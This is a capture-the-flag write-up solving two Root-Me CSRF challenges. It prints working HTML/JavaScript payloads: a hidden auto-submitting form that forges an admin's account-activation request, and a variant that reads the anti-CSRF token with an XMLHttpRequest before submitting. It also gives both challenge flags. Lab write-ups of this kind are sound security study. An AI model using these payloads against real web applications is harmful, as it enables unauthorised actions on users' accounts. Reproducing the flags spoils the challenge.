# CSRF

## 0 protection

### Description

Activate your account to access intranet.

[Start the challenge](http://challenge01.root-me.org/web-client/ch22/)

### Solution

Register and Login

![csrf.png](/assets/ctf/root-me/csrf.png)

Ideally we want to activate our account, but only admin's can do that.

![csrf-1.png](/assets/ctf/root-me/csrf-1.png)

> **Note**: To enable `Status` button edit HTML and remove **disabled** attribute.

Because of challenge title I kind of did no brainer and sent mail with html auto submit form

![csrf-2.png](/assets/ctf/root-me/csrf-2.png)

```html
<form
    id="autoSubmitForm"
    action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile"
    method="POST"
    style="display: none"
>
    <input type="text" name="username" value="YOUR_USERNAME" />
    <input type="checkbox" name="status" checked />
</form>
<script>
    document.getElementById("autoSubmitForm").submit();
</script>
```

And it worked...!

![csrf-3.png](/assets/ctf/root-me/csrf-3.png)

> **Note**: In `Profile` page there was no checkmark 😳 (Totally didn't waste too much time on it)

::: tip Flag
`Csrf_Fr33style-L3v3l1!`
:::

## Token Bypass

### Description

Activate your account to access intranet.

[Start the challenge](http://challenge01.root-me.org/web-client/ch23/)
### Solution

Same structure as previous challenge, but there's `token` value added to request.

![csrf-4.png](/assets/ctf/root-me/csrf-4.png)

Send this to Contact:
```html
<form
    id="autoSubmitForm"
    action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile"
    method="POST"
    style="display: none"
>
    <input type="text" name="username" value="YOUR_USERNAME" />
    <input type="checkbox" name="status" checked />
    <input id="token" type="hidden" name="token" value="..." />
</form>
<script>
    xhr = new XMLHttpRequest();
    xhr.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
    xhr.send();

    const token = xhr.responseText.match(/[a-f0-9]{32}/)[0];
    document.getElementById("token").value = token;

    document.getElementById("autoSubmitForm").submit();
</script>
```

> **Note**: For some reason `async` code didn't work, alongside with `fetch`

![csrf-5.png](/assets/ctf/root-me/csrf-5.png)

::: tip Flag
`Byp4ss_CSRF_T0k3n-w1th-XSS`
:::

